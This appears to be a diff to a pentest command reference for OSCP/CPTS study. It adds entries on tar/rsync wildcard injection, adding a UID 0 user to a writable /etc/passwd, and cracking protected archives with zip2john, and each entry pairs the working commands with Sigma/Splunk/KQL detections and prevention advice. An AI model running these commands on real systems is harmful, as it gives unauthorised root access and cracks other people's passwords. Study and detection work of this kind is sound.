+        "splunk_spl": "index=wineventlog EventCode=5145 ShareName=\"IPC$\" RelativeTargetName=\"FssagentRpc\"\n| table _time, SubjectUserName, IpAddress",
+        "elastic_kql": "event.code:\"5145\" AND winlog.event_data.ShareName:\"IPC$\" AND winlog.event_data.RelativeTargetName:\"FssagentRpc\"",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 5145\n| where ShareName == \"IPC$\" and RelativeTargetName == \"FssagentRpc\"\n| project TimeGenerated, SubjectUserName, IpAddress",
+        "sigma_rules": "win_shadow_coerce_fsrvp_access",
+        "prevention": "Disable MS-FSRVP service if not needed; enforce LDAP signing and channel binding.",
+        "sources": [
+          "https://github.com/ShutdownRepo/ShadowCoerce",
+          "https://attack.mitre.org/techniques/T1187/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "ShadowCoerce - MS-FSRVP pipe access",
+            "logic": "SecurityEvent\n| where EventID == 5145\n| where ShareName == \"IPC$\" and RelativeTargetName == \"FssagentRpc\"\n| project TimeGenerated, SubjectUserName, IpAddress, AccessMask",
+            "data_source": "windows-security",
+            "log_ids": [
+              "5145"
+            ],
+            "attack": [
+              "T1187"
+            ],
+            "fidelity": "signature",
+            "confidence": "high",
+            "false_positives": "Legitimate File Server VSS Agent operations during backup windows",
+            "tuning": "Correlate with NTLM relay indicators (Event 4624 type 3 from unexpected sources)"
+          }
+        ]
+      }
     },
     {
       "type": "command",
@@ -166554,6 +168148,101 @@ const COMMAND_DATA = {
       "explain": "Weaponizes a root cron running tar with a wildcard in a writable directory:\n  echo '...sudoers append...' > root.sh   create the payload script tar will execute\nBecause tar * expands your filenames as arguments, also create files named --checkpoint=1 and --checkpoint-action=exec=sh root.sh. When the cron's tar runs, it treats them as options and executes root.sh as root (here appending a NOPASSWD sudoers line)."
     },
     {
+      "id": "linux-wildcard-injection",
+      "name": "Wildcard Injection - Cron/Script Exploitation via Filenames",
+      "command": "echo '' > '--checkpoint-action=exec=sh shell.sh'",
+      "description": "Wildcard injection exploits shell glob expansion in cron jobs or scripts that use wildcards (tar *, rsync *, chown * etc.). By creating files named as command-line flags, the wildcard expands them into arguments. Most commonly used with tar's --checkpoint feature to execute arbitrary commands when a cron runs tar cf backup.tar *.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "silent",
+      "category": "Privilege Escalation",
+      "subcategory": "Linux - Cron Abuse",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "Linux privilege escalation research; OSCP methodology",
+      "tags": [
+        "wildcard-injection",
+        "cron",
+        "tar",
+        "privilege-escalation",
+        "linux",
+        "filenames-as-arguments"
+      ],
+      "mitre": [
+        "T1053.003"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE IDEA ===\nWhen a script or cron job uses a wildcard like:\n  tar cf /backup/archive.tar *\nThe shell expands * to all filenames. If you create files named\nlike command flags, they become arguments to the command.\n\n=== TAR WILDCARD (most common) ===\n  # Create the payload script\n  echo '#!/bin/bash' > shell.sh\n  echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> shell.sh\n  chmod +x shell.sh\n\n  # Create the 'flag' files\n  echo '' > '--checkpoint=1'\n  echo '' > '--checkpoint-action=exec=sh shell.sh'\n\n  # When cron runs: tar cf backup.tar *\n  # It expands to: tar cf backup.tar --checkpoint=1 --checkpoint-action=exec=sh shell.sh file1 file2...\n  # tar executes shell.sh at each checkpoint!\n\n  # After cron runs:\n  /tmp/rootbash -p   # root shell\n\n=== RSYNC WILDCARD ===\n  # If cron runs: rsync -a * /backup/\n  echo '' > '-e sh shell.sh'\n  # rsync -e executes a shell command\n\n=== CHOWN WILDCARD ===\n  # If cron runs: chown user:group *\n  echo '' > '--reference=/etc/passwd'\n  # Changes ownership to match /etc/passwd owner (root)\n\n=== CHMOD WILDCARD ===\n  # If cron runs: chmod 700 *\n  echo '' > '--reference=/etc/shadow'\n\n=== FINDING TARGETS ===\n  # Check crontab for wildcards\n  cat /etc/crontab\n  ls -la /etc/cron.d/\n  crontab -l\n  # Look for: tar, rsync, chown, chmod with * in writable dirs\n  # Use pspy to watch what runs",
+      "examples": [
+        {
+          "label": "Create tar checkpoint injection files",
+          "command": "echo '' > '--checkpoint=1' && echo '' > '--checkpoint-action=exec=sh shell.sh'"
+        },
+        {
+          "label": "Check crontab for wildcard targets",
+          "command": "cat /etc/crontab | grep -E '\\*' && ls -la /etc/cron.d/"
+        },
+        {
+          "label": "rsync wildcard injection",
+          "command": "echo '' > '-e sh shell.sh'"
+        }
+      ],
+      "references": [
+        {
+          "title": "Unix Wildcard Injection",
+          "url": "https://www.exploit-db.com/papers/33930"
+        },
+        {
+          "title": "GTFOBins - Tar",
+          "url": "https://gtfobins.github.io/gtfobins/tar/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "cron-abuse-pspy",
+          "note": "pspy discovers cron jobs running with wildcards.",
+          "rel": "prereq"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Shell glob expansion treats filenames starting with - as command arguments. tar's --checkpoint-action allows arbitrary command execution, making it the most dangerous target.",
+        "prerequisites": "Write access to a directory where a privileged cron job uses wildcards (tar *, rsync *, etc.).",
+        "impact": "Privilege escalation to the user running the cron job (often root).",
+        "detection": "[MITRE T1053.003] Files with names starting with -- in directories used by cron jobs; tar/rsync processes with unexpected arguments.",
+        "artifacts": "Filesystem entries with flag-like names; process execution showing injected arguments.",
+        "splunk_spl": "index=linux sourcetype=syslog process_name=tar\n| where match(process_args, \"--checkpoint-action\")\n| table _time, user, process_name, process_args",
+        "elastic_kql": "process.name:\"tar\" AND process.args:\"--checkpoint-action*\"",
+        "sentinel_kql": "Syslog\n| where ProcessName == \"tar\" and SyslogMessage contains \"--checkpoint-action\"\n| project TimeGenerated, Computer, SyslogMessage",
+        "sigma_rules": "lnx_wildcard_injection_tar",
+        "prevention": "Never use bare wildcards in privileged scripts; use full paths or find -exec; quote arguments; use -- to separate flags from filenames.",
+        "sources": [
+          "https://www.exploit-db.com/papers/33930",
+          "https://attack.mitre.org/techniques/T1053/003/"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "Tar wildcard injection - checkpoint action",
+            "logic": "title: Tar Checkpoint Action Execution (Wildcard Injection)\nstatus: experimental\nlogsource:\n  category: process_creation\n  product: linux\ndetection:\n  selection:\n    Image|endswith: '/tar'\n    CommandLine|contains: '--checkpoint-action'\n  condition: selection\nlevel: critical",
+            "data_source": "sysmon",
+            "log_ids": [
+              "1"
+            ],
+            "attack": [
+              "T1053.003"
+            ],
+            "fidelity": "signature",
+            "confidence": "high",
+            "false_positives": "Legitimate tar backups using checkpoint for progress reporting (rare)",
+            "tuning": "Alert on any --checkpoint-action in automated/cron context"
+          }
+        ]
+      }
+    },
+    {
       "id": "ad-windapsearch-users",
       "name": "windapsearch - LDAP Enumeration (Python)",
       "command": "python3 windapsearch.py --dc-ip <dc_ip> -u <user>@<domain> -p <password> --da",
@@ -174258,6 +175947,91 @@ const COMMAND_DATA = {
       "explain": "Brute-forces a WordPress account through the XML-RPC endpoint:\n  wpscan                   the WordPress scanner\n  --password-attack xmlrpc  use xmlrpc (faster/quieter than wp-login)\n  -t 20                    20 threads\n  -U <user> -P <wordlist>  the target user and password list\n  --url http://<url>       the site\nRecovered admin creds lead to code execution via the theme editor."
     },
     {
+      "id": "linux-writable-passwd",
+      "name": "Writable /etc/passwd - Add Root-Equivalent User",
+      "command": "openssl passwd -1 newpass",
+      "description": "If /etc/passwd is world-writable (misconfiguration), you can add a new user with UID 0 (root equivalent) or replace root's password hash directly. Works because Linux checks /etc/passwd before /etc/shadow for password hashes if present. One of the fastest linux privesc paths.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Privilege Escalation",
+      "subcategory": "Linux - Miscellaneous",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "Linux privilege escalation methodology",
+      "tags": [
+        "writable-passwd",
+        "privesc",
+        "linux",
+        "uid-0",
+        "password-hash",
+        "misconfiguration"
+      ],
+      "mitre": [
+        "T1078.003"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== CHECK ===\n  ls -la /etc/passwd\n  # Look for -rw-rw-rw- or any write permission for your user/group\n\n=== METHOD 1: Add new root user ===\n  # Generate password hash\n  openssl passwd -1 newpass\n  # Output: $1$xyz$...\n\n  # Add user with UID 0\n  echo 'hacker:$1$xyz$hash_here:0:0:root:/root:/bin/bash' >> /etc/passwd\n\n  # Switch to new user\n  su hacker\n  # Password: newpass\n  # You are now root (UID 0)\n\n=== METHOD 2: Replace root password ===\n  # Generate hash\n  openssl passwd -1 newpass\n  # Edit root's entry to include the hash\n  # Change root:x: to root:$1$xyz$hash:\n\n=== METHOD 3: Python one-liner ===\n  python3 -c \"import crypt; print('hacker:' + crypt.crypt('pass123') + ':0:0::/root:/bin/bash')\" >> /etc/passwd\n\n=== WHY IT WORKS ===\nHistorically, password hashes were stored in /etc/passwd (the 'x'\nin the second field means 'look in /etc/shadow instead'). If you\nput an actual hash there, Linux uses it directly, bypassing shadow.\n\n=== ALSO CHECK ===\n  ls -la /etc/shadow    # writable shadow = same attack\n  ls -la /etc/sudoers   # writable sudoers = add sudo rights",
+      "examples": [
+        {
+          "label": "Generate password hash and add root user",
+          "command": "openssl passwd -1 newpass && echo 'hacker:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd"
+        },
+        {
+          "label": "Check /etc/passwd permissions",
+          "command": "ls -la /etc/passwd /etc/shadow /etc/sudoers"
+        },
+        {
+          "label": "Python method",
+          "command": "python3 -c \"import crypt; print('hacker:' + crypt.crypt('pass123') + ':0:0::/root:/bin/bash')\" >> /etc/passwd"
+        }
+      ],
+      "references": [
+        {
+          "title": "GTFOBins - /etc/passwd",
+          "url": "https://gtfobins.github.io/"
+        },
+        {
+          "title": "Linux Privesc - Writable Files",
+          "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Linux reads /etc/passwd for user information and falls back to password hashes stored there if the 'x' placeholder is replaced with an actual hash.",
+        "prerequisites": "Write access to /etc/passwd (misconfiguration).",
+        "impact": "Immediate root access by creating a UID 0 user.",
+        "detection": "[MITRE T1078.003] Modifications to /etc/passwd; new UID 0 users; file integrity monitoring alerts.",
+        "artifacts": "Modified /etc/passwd with new entries; new UID 0 user in the system.",
+        "splunk_spl": "index=linux sourcetype=linux:audit name=\"/etc/passwd\" key=\"success\"\n| where syscall=\"open\" AND (a1=\"O_WRONLY\" OR a1=\"O_RDWR\")\n| table _time, uid, exe, key",
+        "elastic_kql": "file.path:\"/etc/passwd\" AND event.action:\"opened-for-write\"",
+        "sentinel_kql": "Syslog\n| where SyslogMessage contains \"/etc/passwd\" and SyslogMessage contains \"WRITE\"\n| project TimeGenerated, Computer, SyslogMessage",
+        "sigma_rules": "lnx_file_write_etc_passwd",
+        "prevention": "Ensure /etc/passwd is owned by root with 644 permissions; use file integrity monitoring (AIDE, OSSEC); enforce /etc/shadow for password storage.",
+        "sources": [
+          "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/",
+          "https://attack.mitre.org/techniques/T1078/003/"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "Write to /etc/passwd",
+            "logic": "title: Modification of /etc/passwd\nstatus: stable\nlogsource:\n  product: linux\n  service: auditd\ndetection:\n  selection:\n    type: PATH\n    name: '/etc/passwd'\n  filter:\n    key: 'shadow-utils'\n  condition: selection and not filter\nlevel: critical",
+            "data_source": "linux-audit",
+            "attack": [
+              "T1078.003"
+            ],
+            "fidelity": "signature",
+            "confidence": "high",
+            "false_positives": "Legitimate user management via useradd/usermod (filtered by key)",
+            "tuning": "Exclude changes by known user management tools via audit key filtering"
+          }
+        ]
+      }
+    },
+    {
       "id": "ad-writedacl-linux",
       "name": "WriteDACL to DCSync (bloodyAD, Linux)",
       "command": "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <password> add dcsync <user>",
@@ -179139,10 +180913,115 @@ const COMMAND_DATA = {
         "hardcoded-literal"
       ],
       "explain": "Zeek-based intrusion detection using conn.log, dns.log, smb_files.log, and dce_rpc.log.\nKey techniques: beaconing detection via regular conn.log connection intervals (PowerShell Empire every 5s), DNS exfiltration via high-entropy subdomain enumeration in dns.log, TLS exfiltration via ...\n=== EXAMPLE 1: BEACONING DETECTION (PowerShell Empire) ===\nIndicator: malware beaconing = periodic, regular outbound connections to C2\n\nPCAP: /home/htb-student/pcaps/psempire.pcap\nTool: /usr/local/..."
+    },
+    {
+      "id": "crack-zip2john",
+      "name": "zip2john / rar2john / pdf2john - Protected Archive Hash Extraction",
+      "command": "zip2john protected.zip > hash.txt && john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt",
+      "description": "Extract password hashes from protected ZIP, RAR, PDF, and other file formats using John the Ripper's *2john utilities. The extracted hash can be cracked with john or hashcat. Essential for CTFs and engagements where password-protected archives contain credentials, keys, or sensitive data.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "silent",
+      "category": "Password Attacks",
+      "subcategory": "Cracking Protected Files",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "CPTS password attacks module; John the Ripper",
+      "tags": [
+        "zip2john",
+        "rar2john",
+        "pdf2john",
+        "john",
+        "hash-extraction",
+        "archive-cracking",
+        "password-cracking"
+      ],
+      "mitre": [
+        "T1110.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== ZIP FILES ===\n  zip2john protected.zip > zip_hash.txt\n  john zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\n  # or hashcat:\n  zip2john protected.zip | cut -d: -f2 > hash.txt\n  hashcat -m 13600 hash.txt rockyou.txt  # PKZIP (varies by encryption)\n\n=== RAR FILES ===\n  rar2john protected.rar > rar_hash.txt\n  john rar_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\n  # hashcat modes: -m 12500 (RAR3-hp), -m 13000 (RAR5)\n\n=== PDF FILES ===\n  pdf2john protected.pdf > pdf_hash.txt\n  john pdf_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\n  # hashcat: -m 10400 (PDF 1.1-1.3), -m 10500 (PDF 1.4-1.6), -m 10600 (PDF 1.7)\n\n=== 7Z FILES ===\n  7z2john protected.7z > 7z_hash.txt\n  john 7z_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\n\n=== OTHER FORMATS ===\n  ssh2john id_rsa > ssh_hash.txt          # SSH private keys\n  keepass2john Database.kdbx > kp_hash.txt  # KeePass databases\n  office2john document.docx > doc_hash.txt  # Office documents\n  bitlocker2john -i image > bl_hash.txt    # BitLocker volumes\n  ethereum2john keystore > eth_hash.txt    # Ethereum wallets\n\n=== SHOW CRACKED ===\n  john --show hash.txt\n\n=== WHERE TO FIND PROTECTED FILES ===\n- Backup archives on file shares\n- Developer workstations (.zip, .7z)\n- KeePass databases in user profiles\n- Encrypted SSH keys\n- Password-protected Office docs",
+      "examples": [
+        {
+          "label": "Crack password-protected ZIP",
+          "command": "zip2john protected.zip > hash.txt && john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt"
+        },
+        {
+          "label": "Crack RAR archive",
+          "command": "rar2john backup.rar > hash.txt && john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt"
+        },
+        {
+          "label": "Crack PDF password",
+          "command": "pdf2john report.pdf > hash.txt && john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt"
+        },
+        {
+          "label": "Crack KeePass database",
+          "command": "keepass2john Database.kdbx > hash.txt && john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt"
+        }
+      ],
+      "references": [
+        {
+          "title": "John the Ripper",
+          "url": "https://github.com/openwall/john"
+        },
+        {
+          "title": "Hashcat Wiki - Hash Types",
+          "url": "https://hashcat.net/wiki/doku.php?id=example_hashes"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "gpg2john-pgp-crack",
+          "note": "gpg2john handles PGP/GPG keys specifically.",
+          "rel": "alternative"
+        },
+        {
+          "id": "keepass2john-crack",
+          "note": "keepass2john for KeePass database cracking.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Password-protected archives use reversible encryption that can be brute-forced offline. The *2john tools extract the hash/encrypted header needed for offline cracking.",
+        "prerequisites": "Access to the protected file; john or hashcat installed.",
+        "impact": "Access to encrypted archives containing credentials, keys, or sensitive data.",
+        "detection": "[MITRE T1110.002] File access to encrypted archives; *2john tool execution; john/hashcat processes.",
+        "artifacts": "Access to protected archive files; hash extraction tool execution in process logs.",
+        "splunk_spl": "index=sysmon EventCode=1 (Image=\"*john*\" OR Image=\"*hashcat*\" OR CommandLine=\"*2john*\")\n| table _time, User, Image, CommandLine",
+        "elastic_kql": "process.name:(*john* OR *hashcat*) OR process.command_line:*2john*",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4688 and (NewProcessName contains \"john\" or CommandLine contains \"2john\" or NewProcessName contains \"hashcat\")\n| project TimeGenerated, Account, NewProcessName, CommandLine",
+        "sigma_rules": "proc_creation_lnx_hash_cracking_tools",
+        "prevention": "Use strong passwords (20+ chars) on archives; use AES-256 encryption; consider certificate-based encryption; monitor access to sensitive archives.",
+        "sources": [
+          "https://github.com/openwall/john",
+          "https://attack.mitre.org/techniques/T1110/002/"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "Hash extraction or cracking tool execution",
+            "logic": "title: Password Hash Extraction or Cracking Tool\nstatus: stable\nlogsource:\n  category: process_creation\n  product: linux\ndetection:\n  selection:\n    Image|endswith:\n      - '/john'\n      - '/hashcat'\n    CommandLine|contains:\n      - '2john'\n      - 'zip2john'\n      - 'rar2john'\n  condition: selection\nlevel: medium",
+            "data_source": "sysmon",
+            "log_ids": [
+              "1"
+            ],
+            "attack": [
+              "T1110.002"
+            ],
+            "fidelity": "signature",
+            "confidence": "high",
+            "false_positives": "Security team password auditing",
+            "tuning": "Whitelist security team user accounts"
+          }
+        ]
+      }
     }
   ],
-  "totalCommands": 965,
-  "buildDate": "2026-11-10T12:26:42.493Z",
+  "totalCommands": 985,
+  "buildDate": "2026-11-10T12:40:00.194Z",
   "certifications": [
     "CDSA",
     "CPTS",
